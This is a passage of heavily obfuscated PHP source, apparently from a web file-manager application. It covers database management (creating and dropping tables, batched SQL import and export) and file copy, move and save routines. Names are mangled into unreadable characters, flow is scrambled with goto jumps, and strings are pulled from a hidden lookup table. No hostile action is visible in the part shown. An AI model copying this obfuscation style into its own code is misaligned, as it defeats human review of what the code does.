$E«Íê≠Ê¥ù[33])), $dá¯‹ˆ–Ñé); return $dá¯‹ˆ–Ñé; } public function getLastSql($FçàêµÍüã = '') { return $FçàêµÍüã ? $this->modelSql[$FçàêµÍüã] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($F∂˘´É≈ÚÜ) { return addslashes($F∂˘´É≈ÚÜ); } public function setModel($d«çªÓ•≈) { $this->model = $d«çªÓ•≈; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($C—ﬂ¥–û°á, $bñôœàãå∏ = '') { $this->database = $C—ﬂ¥–û°á; $this->type = $bñôœàãå∏; } public function model($aâ„õ¡ˆ†Ü = '') { return new ModelBase($aâ„õ¡ˆ†Ü, $_SERVER[’ÿƒ†ïò][33], $this->database); } public function db($BÒíÃ°…´ı = false) { goto CÖÚπÔ∑≤â; aÃ≈âà√Ö¢: if (!$d£±¥òñ·ç) { $cÏÜ¬ûÒö¶->execute("\143\x72\x65\x61\x74\145\40\144\141\x74\x61\142\141\x73\145\40\140{$EÒî–á¡¥à}\140"); } $f†Áúä≠Çﬂ[$Bì¥€⁄œë◊[959]] = $EÒî–á¡¥à; if ($f†Áúä≠Çﬂ[$Bì¥€⁄œë◊[784]] == $Bì¥€⁄œë◊[785]) { $f†Áúä≠Çﬂ[$Bì¥€⁄œë◊[786]] .= $Bì¥€⁄œë◊[1046] . $EÒî–á¡¥à; } goto f⁄∏‹¥ÖÈÙ; f⁄∏‹¥ÖÈÙ: $this->database = $f†Áúä≠Çﬂ; $cÏÜ¬ûÒö¶->execute("\165\163\x65\40\x60{$EÒî–á¡¥à}\x60"); return $cÏÜ¬ûÒö¶; goto FÂïœµå¿®; cç»Ëà∑º§: $this->database = $f†Áúä≠Çﬂ; $cÏÜ¬ûÒö¶ = $this->model()->db(); try { $d£±¥òñ·ç = $cÏÜ¬ûÒö¶->execute("\163\x68\x6f\167\40\x64\x61\164\141\x62\x61\163\x65\163\40\x6c\151\153\145\x20\x27{$EÒî–á¡¥à}\x27"); } catch (Exception $bùﬁÑ≤Ç«¥) { } goto aÃ≈âà√Ö¢; B ÊÖ¯üñ±: $EÒî–á¡¥à = $f†Áúä≠Çﬂ[$Bì¥€⁄œë◊[959]]; $f†Áúä≠Çﬂ[$Bì¥€⁄œë◊[959]] = $Bì¥€⁄œë◊[33]; if ($f†Áúä≠Çﬂ[$Bì¥€⁄œë◊[784]] == $Bì¥€⁄œë◊[785]) { $eç£™Ñë¨∏ = $f†Áúä≠Çﬂ[$Bì¥€⁄œë◊[786]]; $f†Áúä≠Çﬂ[$Bì¥€⁄œë◊[786]] = substr($eç£™Ñë¨∏, 0, strrpos($eç£™Ñë¨∏, $Bì¥€⁄œë◊[1046])); } goto cç»Ëà∑º§; CÖÚπÔ∑≤â: $Bì¥€⁄œë◊ =& $_SERVER[’ÿƒ†ïò]; $f†Áúä≠Çﬂ = array_change_key_case($this->database); if ($this->type == $Bì¥€⁄œë◊[9] || !$BÒíÃ°…´ı) { return $this->model()->db(); } goto B ÊÖ¯üñ±; FÂïœµå¿®: } public function createTable($F‰Á€Ó¥ºÖ, $AÈ°ıÂåí≈ = null) { $A©ﬁŒö√üˆ =& $_SERVER[’ÿƒ†ïò]; if (!IO::exist($F‰Á€Ó¥ºÖ)) { ActionCall($A©ﬁŒö√üˆ[1047], !0, 0); show_json(LNG($A©ﬁŒö√üˆ[1048]), !1); } $EΩÏ¡î±º∑ = sqlSplit(IO::getContent($F‰Á€Ó¥ºÖ)); foreach ($EΩÏ¡î±º∑ as $C·ÎÆµÚ‚ª) { if ($AÈ°ıÂåí≈) { $bÎÃÈºå°‹ = stripos($C·ÎÆµÚ‚ª, $A©ﬁŒö√üˆ[1049]) === 0; if ($bÎÃÈºå°‹) { $AÈ°ıÂåí≈->task[$A©ﬁŒö√üˆ[1050]] += 1; } } $this->model()->db()->execute($C·ÎÆµÚ‚ª); if ($AÈ°ıÂåí≈ && $bÎÃÈºå°‹) { preg_match($A©ﬁŒö√üˆ[1051], $C·ÎÆµÚ‚ª, $aÊöˆúæòÔ); $AÈ°ıÂåí≈->task[$A©ﬁŒö√üˆ[1052]] = $aÊöˆúæòÔ[1]; $AÈ°ıÂåí≈->update(1); } } $this->taskToCache($AÈ°ıÂåí≈); } public function insertTable($d•à£∫ÿ”Ç, $Eå™Çä€©∫ = null) { $c¯ àΩ∂…± =& $_SERVER[’ÿƒ†ïò]; $BÑ€í∂ÂØ¶ = $this->model()->db(); $eÇÃËÀë”È = $EóèÌÿ⁄°≈ ? array($EóèÌÿ⁄°≈) : $BÑ€í∂ÂØ¶->getTables(); foreach ($d•à£∫ÿ”Ç as $cÓ†¿Û°»‚) { $EóèÌÿ⁄°≈ = basename($cÓ†¿Û°»‚, $c¯ àΩ∂…±[774]); if (!in_array($EóèÌÿ⁄°≈, $eÇÃËÀë”È)) { continue; } if ($Eå™Çä€©∫) { $Eå™Çä€©∫->task[$c¯ àΩ∂…±[1052]] = $EóèÌÿ⁄°≈; } if (get_filesize($cÓ†¿Û°»‚) == 0) { continue; } $aıí€ØÖÎÖ = $this->sqlToDb($cÓ†¿Û°»‚, $Eå™Çä€©∫); if (!$aıí€ØÖÎÖ) { ActionCall($c¯ àΩ∂…±[1047], !0, 0); show_json(LNG($c¯ àΩ∂…±[1053]) . "\x5b{$EóèÌÿ⁄°≈}\135", !1); } } $this->taskToCache($Eå™Çä€©∫); } public function sqlFromDb($Eéâ∏é“ÏÊ, $e¢¢ƒñ„≈•, $c•Ò≤‹ı‹≠ = null, $dçéèÆ¢ìœ = null) { goto cõíÖµÇâÌ; c¥”˜ÔµµÉ: $FûÒ”Êª•ì = $d§Üß„ë≈õ->getPk(); $fÕÓöçõÓé = $d§Üß„ë≈õ->getDbFields(); do { $CûÒãÚ⁄í‡ = array($FûÒ”Êª•ì => array($_SERVER[’ÿƒ†ïò][1001], $Eﬁÿﬁ™œà)); $e¨ß∆çàÎé = $d§Üß„ë≈õ->where($CûÒãÚ⁄í‡)->field($fÕÓöçõÓé)->order($FûÒ”Êª•ì . $_SERVER[’ÿƒ†ïò][1055])->limit($D“◊Öê‰ûﬂ)->select(); $e¨ß∆çàÎé = !empty($e¨ß∆çàÎé) ? $e¨ß∆çàÎé : array(); if (!($FÖ®¯ç∫ä÷ = count($e¨ß∆çàÎé))) { break; } $c•Ó≈ê¢∑Ñ = end($e¨ß∆çàÎé); $Eﬁÿﬁ™œà = $c•Ó≈ê¢∑Ñ[$FûÒ”Êª•ì]; $fâé»ê£›œ = array(); foreach ($e¨ß∆çàÎé as $Bê®ÁÌ›‚Ã) { if ($Eéâ∏é“ÏÊ == $_SERVER[’ÿƒ†ïò][1056] && $Bê®ÁÌ›‚Ã[$_SERVER[’ÿƒ†ïò][29]] == $_SERVER[’ÿƒ†ïò][1057]) { $eÉçç¯ÿ£é = json_decode($Bê®ÁÌ›‚Ã[$_SERVER[’ÿƒ†ïò][372]], !0); if ($eÉçç¯ÿ£é[$_SERVER[’ÿƒ†ïò][28]] == date($_SERVER[’ÿƒ†ïò][739]) && !$eÉçç¯ÿ£é[$_SERVER[’ÿƒ†ïò][738]]) { continue; } } if ($dçéèÆ¢ìœ) { $Bê®ÁÌ›‚Ã[$_SERVER[’ÿƒ†ïò][76]] = "\x7b\151\157\72{$dçéèÆ¢ìœ}\175" . substr($Bê®ÁÌ›‚Ã[$_SERVER[’ÿƒ†ïò][76]], strlen("\x7b\x69\x6f\72{$Bê®ÁÌ›‚Ã[$_SERVER[’ÿƒ†ïò][812]]}\x7d")); $Bê®ÁÌ›‚Ã[$_SERVER[’ÿƒ†ïò][812]] = $dçéèÆ¢ìœ; } $fâé»ê£›œ[] = $_SERVER[’ÿƒ†ïò][1058] . $this->sqlEncode($Bê®ÁÌ›‚Ã) . $_SERVER[’ÿƒ†ïò][1059]; } $EÔìØÑ¥‘ñ = "\111\x4e\x53\x45\x52\124\x20\x49\x4e\124\x4f\x20\140{$Eéâ∏é“ÏÊ}\x60\x20\x28\x60" . implode($_SERVER[’ÿƒ†ïò][1060], $fÕÓöçõÓé) . $_SERVER[’ÿƒ†ïò][1061]; fwrite($BëıÎ‡∑ùü, $EÔìØÑ¥‘ñ . implode($_SERVER[’ÿƒ†ïò][1062], $fâé»ê£›œ) . $_SERVER[’ÿƒ†ïò][68] . PHP_EOL); $dåÇß¡ë”‡ += $FÖ®¯ç∫ä÷; if ($c•Ò≤‹ı‹≠) { $c•Ò≤‹ı‹≠->update($FÖ®¯ç∫ä÷); } } while ($D“◊Öê‰ûﬂ == $FÖ®¯ç∫ä÷); goto FÃ®«øè‡Œ; cõíÖµÇâÌ: if ($c•Ò≤‹ı‹≠) { $c•Ò≤‹ı‹≠->task[$_SERVER[’ÿƒ†ïò][1052]] = $Eéâ∏é“ÏÊ; } $d§Üß„ë≈õ = $this->model($Eéâ∏é“ÏÊ); $dåÇß¡ë”‡ = 0; goto B≈’§¬ñøÈ; FÃ®«øè‡Œ: fclose($BëıÎ‡∑ùü); return $dåÇß¡ë”‡; goto FŸ∂ÊŒµå¨; B≈’§¬ñøÈ: $Eﬁÿﬁ™œà = 0; $D“◊Öê‰ûﬂ = 10000; $BëıÎ‡∑ùü = fopen($e¢¢ƒñ„≈•, $_SERVER[’ÿƒ†ïò][1054]); goto c¥”˜ÔµµÉ; FŸ∂ÊŒµå¨: } public function sqlToDb($d÷≠»¥å–∂, $C±ﬁÓáå¯¥ = null) { goto B®â›˘“É; F€◊≈º∞∞ã: $b‘ﬁÏçÉæ = 0; $BÔ«ø‚⁄…± = 4194304 - 104858; $fﬂí˜∆ÇÒÿ = 1000000 - 104858; goto EÓ≠‹ÿÆ˜⁄; C««êÓèî±: if (!$cëÕ¥ÜÇã›) { return !1; } $a∆°ïúπ¡ª = 0; $aÕÁã≈áÏ– = $bµëÉ†∞¥‹[33]; goto eıéü‘õ§; CüÈ‘∫˜√±: return !0; goto AêÁæ‹√üê; B®â›˘“É: $bµëÉ†∞¥‹ =& $_SERVER[’ÿƒ†ïò]; $bﬂãﬁ∫°”Ã = $this->model()->db(); $cëÕ¥ÜÇã› = @fopen($d÷≠»¥å–∂, $bµëÉ†∞¥‹[1063]); goto C««êÓèî±; EÓ≠‹ÿÆ˜⁄: while (!feof($cëÕ¥ÜÇã›)) { $c∑§÷æ›œ† = trim(fgets($cëÕ¥ÜÇã›)); if (!$c∑§÷æ›œ†) { continue; } $cãìõú∆íï = $this->sqlDecode($c∑§÷æ›œ†, $this->type); if (stripos($cãìõú∆íï, $bµëÉ†∞¥‹[353]) === 0) { if (!$aÕÁã≈áÏ–) { $aÕÁã≈áÏ– = $cãìõú∆íï . $bµëÉ†∞¥‹[50]; } continue; } if ($C±ﬁÓáå¯¥) { $C±ﬁÓáå¯¥->task[$bµëÉ†∞¥‹[1050]] += 1; } $a∆°ïúπ¡ª++; $e÷™–£À¨∑[] = rtrim(rtrim(trim($cãìõú∆íï), $bµëÉ†∞¥‹[47]), $bµëÉ†∞¥‹[68]); $aÖ≈úï¯ø§ = null; $EÓ…Œ÷ÚÇØ = strlen($cãìõú∆íï); $b‘ﬁÏçÉæ += $EÓ…Œ÷ÚÇØ; if ($b‘ﬁÏçÉæ >= ($E∑ÚòàÚ¨Õ == 500 ? $BÔ«ø‚⁄…± : $fﬂí˜∆ÇÒÿ)) { $aÖ≈úï¯ø§ = array_pop($e÷™–£À¨∑); if ($a∆°ïúπ¡ª > 1) { $a∆°ïúπ¡ª--; } } if ($a∆°ïúπ¡ª >= $E∑ÚòàÚ¨Õ || $aÖ≈úï¯ø§) { goto EÜÜèÙﬂÖÖ; EÜÜèÙﬂÖÖ: $cãìõú∆íï = $aÕÁã≈áÏ– . implode($bµëÉ†∞¥‹[47], $e÷™–£À¨∑); if (!$bﬂãﬁ∫°”Ã->execute($cãìõú∆íï)) { return !1; } if ($C±ﬁÓáå¯¥) { $C±ﬁÓáå¯¥->update($a∆°ïúπ¡ª); } goto Cì∂÷¨„å∑; FäõàΩ∑«•: if ($aÖ≈úï¯ø§) { $e÷™–£À¨∑ = array($aÖ≈úï¯ø§); $a∆°ïúπ¡ª = 1; $b‘ﬁÏçÉæ = $EÓ…Œ÷ÚÇØ; } goto D‰À®êëÆ∑; Cì∂÷¨„å∑: $e÷™–£À¨∑ = array(); $a∆°ïúπ¡ª = 0; $b‘ﬁÏçÉæ = 0; goto FäõàΩ∑«•; D‰À®êëÆ∑: } } fclose($cëÕ¥ÜÇã›); if (!empty($e÷™–£À¨∑)) { $cãìõú∆íï = $aÕÁã≈áÏ– . implode($bµëÉ†∞¥‹[47], $e÷™–£À¨∑); if (!$bﬂãﬁ∫°”Ã->execute($cãìõú∆íï)) { return !1; } if ($C±ﬁÓáå¯¥) { $C±ﬁÓáå¯¥->update($a∆°ïúπ¡ª); } } goto CüÈ‘∫˜√±; eıéü‘õ§: $e÷™–£À¨∑ = array(); $E∑ÚòàÚ¨Õ = $this->type == $bµëÉ†∞¥‹[9] ? 500 : 2000; $AŸÃÈ˘Ùùò = basename($d÷≠»¥å–∂, $bµëÉ†∞¥‹[774]); goto F€◊≈º∞∞ã; AêÁæ‹√üê: } public function dropTable($Dπ—ˆô¨ùﬂ = null) { $Cæ∏áÈ©´ = $this->model()->db(); $F—¿¶·◊¨Ó = $Dπ—ˆô¨ùﬂ ? array($Dπ—ˆô¨ùﬂ) : $Cæ∏áÈ©´->getTables(); if (!$F—¿¶·◊¨Ó) { return; } foreach ($F—¿¶·◊¨Ó as $Dπ—ˆô¨ùﬂ) { if ($Dπ—ˆô¨ùﬂ) { $Dπ—ˆô¨ùﬂ = strtolower($Dπ—ˆô¨ùﬂ); } else { continue; } $Cæ∏áÈ©´->execute("\x64\x72\157\160\x20\164\x61\142\154\145\40\x69\146\x20\x65\x78\x69\x73\164\x73\40\x60{$Dπ—ˆô¨ùﬂ}\x60"); } } private function taskToCache($A√™‘ŸŒ∑å = null) { $dáá´ŸàáÑ =& $_SERVER[’ÿƒ†ïò]; if (!$A√™‘ŸŒ∑å) { return; } $E‰ª…ì¢‚Á = array($dáá´ŸàáÑ[1052] => $A√™‘ŸŒ∑å->task[$dáá´ŸàáÑ[1052]], $dáá´ŸàáÑ[1050] => $A√™‘ŸŒ∑å->task[$dáá´ŸàáÑ[1050]], $dáá´ŸàáÑ[1064] => $A√™‘ŸŒ∑å->task[$dáá´ŸàáÑ[1064]]); if ($E‰ª…ì¢‚Á[$dáá´ŸàáÑ[1050]] == $E‰ª…ì¢‚Á[$dáá´ŸàáÑ[1064]]) { $E‰ª…ì¢‚Á[$dáá´ŸàáÑ[748]] = 1; } Cache::set($dáá´ŸàáÑ[1065] . $A√™‘ŸŒ∑å->task[$dáá´ŸàáÑ[395]], $E‰ª…ì¢‚Á); $A√™‘ŸŒ∑å->end(); } private function sqlEncode($c±≤«ÍßÒò) { $cãÚ≥»—üÂ =& $_SERVER[’ÿƒ†ïò]; $a≈ê•ÈÓ≥Œ = array(); foreach ($c±≤«ÍßÒò as $f∏Î‰Æ∞äÖ) { if (is_array($f∏Î‰Æ∞äÖ)) { $f∏Î‰Æ∞äÖ = json_encode_force($f∏Î‰Æ∞äÖ); } $f∏Î‰Æ∞äÖ = addslashes($f∏Î‰Æ∞äÖ); $f∏Î‰Æ∞äÖ = str_replace(array($cãÚ≥»—üÂ[1066], $cãÚ≥»—üÂ[229]), array($cãÚ≥»—üÂ[1067], $cãÚ≥»—üÂ[1068]), $f∏Î‰Æ∞äÖ); $a≈ê•ÈÓ≥Œ[] = str_replace($cãÚ≥»—üÂ[55], $cãÚ≥»—üÂ[1069], $f∏Î‰Æ∞äÖ); } return $cãÚ≥»—üÂ[55] . implode($cãÚ≥»—üÂ[1070], $a≈ê•ÈÓ≥Œ) . $cãÚ≥»—üÂ[55]; } private function sqlDecode($cŸÕÍ√ÙÀé, $A‹ÃßäääŒ) { $F˜ÿÇ≤º»º =& $_SERVER[’ÿƒ†ïò]; $cŸÕÍ√ÙÀé = str_replace(array($F˜ÿÇ≤º»º[1067], $F˜ÿÇ≤º»º[1068]), array($F˜ÿÇ≤º»º[1066], $F˜ÿÇ≤º»º[229]), $cŸÕÍ√ÙÀé); if ($A‹ÃßäääŒ == $F˜ÿÇ≤º»º[9]) { $cŸÕÍ√ÙÀé = stripslashes($cŸÕÍ√ÙÀé); } return $cŸÕÍ√ÙÀé; } } goto fÖÓ–·ﬂﬁÇ; fÖÓ–·ﬂﬁÇ: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($fä∫ôÇÏå„, $dŸ¬ÖÉï©†) { goto Eö˘ñû‹Ü∆; CŸÎ¨◊±ÁÁ: Hook::trigger($d®˘’‡¡ŒÉ[1072] . $fä∫ôÇÏå„ . $d®˘’‡¡ŒÉ[1073], $eòü≠°ÌÃœ); $c•´ÊáéÏí = self::driverMake($dŸ¬ÖÉï©†[0]); if (method_exists($c•´ÊáéÏí, $fä∫ôÇÏå„)) { $C»Ôçäââú = @call_user_func_array(array($c•´ÊáéÏí, $fä∫ôÇÏå„), $dŸ¬ÖÉï©†); } else { if (method_exists($c•´ÊáéÏí, $d®˘’‡¡ŒÉ[1074])) { $C»Ôçäââú = @call_user_func_array(array($c•´ÊáéÏí, $fä∫ôÇÏå„), $dŸ¬ÖÉï©†); } else { if (method_exists(self, $fä∫ôÇÏå„)) { $C»Ôçäââú = @call_user_func_array(array(self, $fä∫ôÇÏå„), $dŸ¬ÖÉï©†); } else { $C»Ôçäââú = call_user_func_array(array(parent, $fä∫ôÇÏå„), $dŸ¬ÖÉï©†); } } } goto a±ã∂ﬂñØ≥; a±ã∂ﬂñØ≥: Hook::trigger($d®˘’‡¡ŒÉ[1072] . $fä∫ôÇÏå„ . $d®˘’‡¡ŒÉ[1075], $eòü≠°ÌÃœ, $C»Ôçäââú); return $C»Ôçäââú; goto EåÒ¡¨œÚ“; Eö˘ñû‹Ü∆: $d®˘’‡¡ŒÉ =& $_SERVER[’ÿƒ†ïò]; $eòü≠°ÌÃœ = $dŸ¬ÖÉï©†; $GLOBALS[$d®˘’‡¡ŒÉ[1071]] = $d®˘’‡¡ŒÉ[1072] . $fä∫ôÇÏå„; goto CŸÎ¨◊±ÁÁ; EåÒ¡¨œÚ“: } public static function init($D‘Ïºéïü≤) { return self::driverMake($D‘Ïºéïü≤); } public static function copy($C¨√â∂„üπ, $F–π™üπ´‚, $Dºﬂ¡øÿÈË = false, $eó‡ù∆ﬁÓ≤ = false) { return self::copyMoveStart($C¨√â∂„üπ, $F–π™üπ´‚, $Dºﬂ¡øÿÈË, $_SERVER[’ÿƒ†ïò][543], $eó‡ù∆ﬁÓ≤); } public static function move($e≥∫¿©–√Ê, $cÆó∫≠∏ä‹, $A‹…ô⁄˘”Ú = false, $a»áÁÚ—›ë = false) { return self::copyMoveStart($e≥∫¿©–√Ê, $cÆó∫≠∏ä‹, $A‹…ô⁄˘”Ú, $_SERVER[’ÿƒ†ïò][545], $a»áÁÚ—›ë); } private static function copyMoveStart($cø⁄§ã¶òÿ, $c≤Œëπ„«∆, $fÉ‰·•òéø, $B‡Â…¨Ó›≠, $aúèÚîÉÎÙ) { $e∆è‚Ó–ó± =& $_SERVER[’ÿƒ†ïò]; $eÍÖ±ò¢üñ = array($cø⁄§ã¶òÿ, $c≤Œëπ„«∆, $fÉ‰·•òéø, $aúèÚîÉÎÙ); Hook::trigger($e∆è‚Ó–ó±[1072] . $B‡Â…¨Ó›≠ . $e∆è‚Ó–ó±[1073], $eÍÖ±ò¢üñ); $cì€óéãÜ‘ = self::copyMove($cø⁄§ã¶òÿ, $c≤Œëπ„«∆, $fÉ‰·•òéø, $B‡Â…¨Ó›≠, $aúèÚîÉÎÙ); Hook::trigger($e∆è‚Ó–ó±[1072] . $B‡Â…¨Ó›≠ . $e∆è‚Ó–ó±[1075], $eÍÖ±ò¢üñ, $cì€óéãÜ‘); return $cì€óéãÜ‘; } public static function saveFile($cﬁ©Õâê©Õ, $F≠ÑÃŸ°º∑, $E®ﬁçéúôé = true) { goto Cà≠ç˘ãª∂; Aè»ΩÇ‹ôÀ: return $BËÎ∆„ß—¶; goto C®∫úÒÑÑ; Cë”éÇ¡çª: if ($B∏¶êÑ·ﬂﬁ->pathParse[$FÏâ°˜Ÿ‹≥[1076]]) { $B∏¶êÑ·ﬂﬁ = self::driverMake($B∏¶êÑ·ﬂﬁ->pathParse[$FÏâ°˜Ÿ‹≥[1076]]); } $Aó£ÌÖ•Òç = $A≥äùàÖÔÚ->pathFather($F≠ÑÃŸ°º∑); $Cô•õÑ°†Ö = !0; goto F∫ñÎøÍâã; fÉãÛØ£∞ƒ: $A≥äùàÖÔÚ = self::driverMake($F≠ÑÃŸ°º∑); $d›±¯ë—¢Õ = !1; if ($A≥äùàÖÔÚ->pathParse[$FÏâ°˜Ÿ‹≥[1076]]) { $d›±¯ë—¢Õ = $A≥äùàÖÔÚ; $A≥äùàÖÔÚ = self::driverMake($A≥äùàÖÔÚ->pathParse[$FÏâ°˜Ÿ‹≥[1076]]); } goto Cë”éÇ¡çª; Cà≠ç˘ãª∂: $FÏâ°˜Ÿ‹≥ =& $_SERVER[’ÿƒ†ïò]; $DÉô√ÿÑøÍ = self::info($F≠ÑÃŸ°º∑); $B∏¶êÑ·ﬂﬁ = self::driverMake($cﬁ©Õâê©Õ); goto fÉãÛØ£∞ƒ; F∫ñÎøÍâã: if (!$E®ﬁçéúôé && self::driverIsSame($B∏¶êÑ·ﬂﬁ, $A≥äùàÖÔÚ)) { $Cô•õÑ°†Ö = !1; } $BËÎ∆„ß—¶ = self::copyFile($B∏¶êÑ·ﬂﬁ, $cﬁ©Õâê©Õ, $A≥äùàÖÔÚ, $Aó£ÌÖ•Òç, $DÉô√ÿÑøÍ[$FÏâ°˜Ÿ‹≥[28]], $Cô•õÑ°†Ö); if ($d›±¯ë—¢Õ) { $BËÎ∆„ß—¶ = $d›±¯ë—¢Õ->getPathOuter($BËÎ∆„ß—¶); } goto Aè»ΩÇ‹ôÀ; C®∫úÒÑÑ: } private static function copyMove($båáâÈœí®, $E∂—ºÑ¬Ï, $Bâä¢¶¡ùÀ, $d´˘±´ìï¬, $aâß Ìπí◊ = false) { goto aÍÁ’è›Ó∫; A∆⁄ãËäÛÌ: $aÔ√ÇˆÕ∂ﬂ = !1; if ($bÒ£ﬂäá˜ö->pathParse[$füøÉìØ‚ª[1076]]) { $aÔ√ÇˆÕ∂ﬂ = $bÒ£ﬂäá˜ö; $bÒ£ﬂäá˜ö = self::driverMake($bÒ£ﬂäá˜ö->pathParse[$füøÉìØ‚ª[1076]]); } if ($A¥î¡êîÜ˜->pathParse[$füøÉìØ‚ª[1076]]) { $A¥î¡êîÜ˜ = self::driverMake($A¥î¡êîÜ˜->pathParse[$füøÉìØ‚ª[1076]]); } goto d¨ú‹¶∆ËÍ; FáõÉÊö‹É: $A¥î¡êîÜ˜ = self::driverMake($båáâÈœí®); $bÒ£ﬂäá˜ö = self::driverMake($E∂—ºÑ¬Ï); $fË§ÑŒÀ Ë = $d´˘±´ìï¬ == $füøÉìØ‚ª[545]; goto A∆⁄ãËäÛÌ; FëÀ„‰‰ùè: if ($cÀÖêÁ≥ãì) { if ($d´˘±´ìï¬ == $füøÉìØ‚ª[545] && !method_exists($bÒ£ﬂäá˜ö, $füøÉìØ‚ª[1077]) && trim($E∂—ºÑ¬Ï, $füøÉìØ‚ª[8]) == trim($bÒ£ﬂäá˜ö->pathFather($båáâÈœí®), $füøÉìØ‚ª[8])) { if ($A¥î¡êîÜ˜->pathThis($båáâÈœí®) != $aâß Ìπí◊ && !$A¥î¡êîÜ˜->isTypeObject()) { return $A¥î¡êîÜ˜->rename($båáâÈœí®, $aâß Ìπí◊); } return $bÒ£ﬂäá˜ö->getPathOuter($båáâÈœí®); } if (method_exists($bÒ£ﬂäá˜ö, $d´˘±´ìï¬)) { return $bÒ£ﬂäá˜ö->{$d´˘±´ìï¬}($båáâÈœí®, $E∂—ºÑ¬Ï, $Bâä¢¶¡ùÀ); } } $FˆƒÎ√Ù Ñ = $A¥î¡êîÜ˜->isFile($båáâÈœí®); if (!$FˆƒÎ√Ù Ñ && $bÒ£ﬂäá˜ö->getType() == $füøÉìØ‚ª[746] && $A¥î¡êîÜ˜->getType() == $füøÉìØ‚ª[106]) { $BñÍÖΩÜ◊Â = $bÒ£ﬂäá˜ö->copyFolderFromIO($A¥î¡êîÜ˜, $båáâÈœí®, $E∂—ºÑ¬Ï, $Bâä¢¶¡ùÀ, $fË§ÑŒÀ Ë, $aâß Ìπí◊); } else { $BñÍÖΩÜ◊Â = self::copyPath($A¥î¡êîÜ˜, $båáâÈœí®, $bÒ£ﬂäá˜ö, $E∂—ºÑ¬Ï, $Bâä¢¶¡ùÀ, $fË§ÑŒÀ Ë, $FˆƒÎ√Ù Ñ, $aâß Ìπí◊); } goto bÎ“ñ¿Û¯≤; d¨ú‹¶∆ËÍ: self::check($A¥î¡êîÜ˜, $båáâÈœí®, $bÒ£ﬂäá˜ö, $E∂—ºÑ¬Ï); Hook::trigger($füøÉìØ‚ª[73], $A¥î¡êîÜ˜, $båáâÈœí®, $bÒ£ﬂäá˜ö, $E∂—ºÑ¬Ï); $cÀÖêÁ≥ãì = self::driverIsSame($A¥î¡êîÜ˜, $bÒ£ﬂäá˜ö); goto FëÀ„‰‰ùè; aÍÁ’è›Ó∫: $füøÉìØ‚ª =& $_SERVER[’ÿƒ†ïò]; if (!$båáâÈœí® || $båáâÈœí® == $füøÉìØ‚ª[8] || !$E∂—ºÑ¬Ï) { return !1; } ignore_timeout(); goto FáõÉÊö‹É; bÎ“ñ¿Û¯≤: if ($BñÍÖΩÜ◊Â && $fË§ÑŒÀ Ë) { $A¥î¡êîÜ˜->remove($båáâÈœí®); } if ($aÔ√ÇˆÕ∂ﬂ) { $BñÍÖΩÜ◊Â = $aÔ√ÇˆÕ∂ﬂ->getPathOuter($BñÍÖΩÜ◊Â); } return $BñÍÖΩÜ◊Â; goto b‰ØÖ·Êàô; b‰ØÖ·Êàô: } private static function check($dÌ´ßÖá◊´, $cÿòóéæíå, $DÚÜ⁄ôé∆”, &$FíòÖ÷ñë) { $Dπ∂à‰¢ª¨ =& $_SERVER[’ÿƒ†ïò]; if (self::driverIsSame($dÌ´ßÖá◊´, $DÚÜ⁄ôé∆”) && $dÌ´ßÖá◊´->isFolder($cÿòóéæíå) && $dÌ´ßÖá◊´->isParentOf($cÿòóéæíå, $FíòÖ÷ñë)) { show_json(LNG($Dπ∂à‰¢ª¨[1078]), !1); } if (!$dÌ´ßÖá◊´->exist($cÿòóéæíå)) { show_json(LNG($Dπ∂à‰¢ª¨[105]), !1); } } private static function copyPath($cô√¶∂±Áõ, $f‹ãÛ¬Öó¡, $D•à®‹äﬂ”, $bå”∑‡‘∂Æ, $DóéâÇÜÓç, $Bπï⁄æâ≈∏, $b§≥»‹¬‡, $D∫ªµ®‚ä± = false) { goto D⁄åé¡‘óµ; D¢Œ•—ÉÖá: $D§ÎÃÃÚ Ü = $D•à®‹äﬂ”->mkdir($D•à®‹äﬂ”->getPath($Aù¬¡äëõ¿)); $bå”∑‡‘∂Æ = $D•à®‹äﬂ”->getPathInner($D§ÎÃÃÚ Ü); $B≤¬Çº≤Ãπ = $cô√¶∂±Áõ->listPath($f‹ãÛ¬Öó¡, !0); goto d√ë€Ü˜≈“; d√ë€Ü˜≈“: $B≤¬Çº≤Ãπ = is_array($B≤¬Çº≤Ãπ) ? $B≤¬Çº≤Ãπ : array($e∂§ãÎ©ÿÙ[74] => array(), $e∂§ãÎ©ÿÙ[75] => array()); $D√éƒßçí¢ = array_merge($B≤¬Çº≤Ãπ[$e∂§ãÎ©ÿÙ[74]], $B≤¬Çº≤Ãπ[$e∂§ãÎ©ÿÙ[75]]); foreach ($D√éƒßçí¢ as $C«¥›Ù∂“’) { $b‘ıÛÉû«è = $C«¥›Ù∂“’[$e∂§ãÎ©ÿÙ[29]] == $e∂§ãÎ©ÿÙ[193]; $f‹ãÛ¬Öó¡ = $cô√¶∂±Áõ->getPathInner($C«¥›Ù∂“’[$e∂§ãÎ©ÿÙ[76]]); $d¨µø˘øôı = self::copyPath($cô√¶∂±Áõ, $f‹ãÛ¬Öó¡, $D•à®‹äﬂ”, $bå”∑‡‘∂Æ, $DóéâÇÜÓç, $Bπï⁄æâ≈∏, $b‘ıÛÉû«è); if (!$d¨µø˘øôı) { IO::errorTips($e∂§ãÎ©ÿÙ[1079] . $f‹ãÛ¬Öó¡ . $e∂§ãÎ©ÿÙ[67] . $bå”∑‡‘∂Æ); } } goto dßöÉÎ€–à; D⁄åé¡‘óµ: $e∂§ãÎ©ÿÙ =& $_SERVER[’ÿƒ†ïò]; $F⁄–’Ù¯Ë∏ = empty($D∫ªµ®‚ä±) && $D∫ªµ®‚ä± !== $e∂§ãÎ©ÿÙ[191] ? $cô√¶∂±Áõ->pathThis($f‹ãÛ¬Öó¡) : $D∫ªµ®‚ä±; if ($DóéâÇÜÓç) { $CÔ¨ƒ– πÓ = $D•à®‹äﬂ”->fileNameExist($bå”∑‡‘∂Æ, $F⁄–’Ù¯Ë∏); $F⁄–’Ù¯Ë∏ = $D•à®‹äﬂ”->fileNameAuto($bå”∑‡‘∂Æ, $F⁄–’Ù¯Ë∏, $DóéâÇÜÓç, !$b§≥»‹¬‡); $DóéâÇÜÓç = $CÔ¨ƒ– πÓ ? $DóéâÇÜÓç : !1; } goto EÌö≈Ó÷è; dßöÉÎ€–à: self::copyMoveKeepInfo($cô√¶∂±Áõ, $f‹ãÛ¬Öó¡, 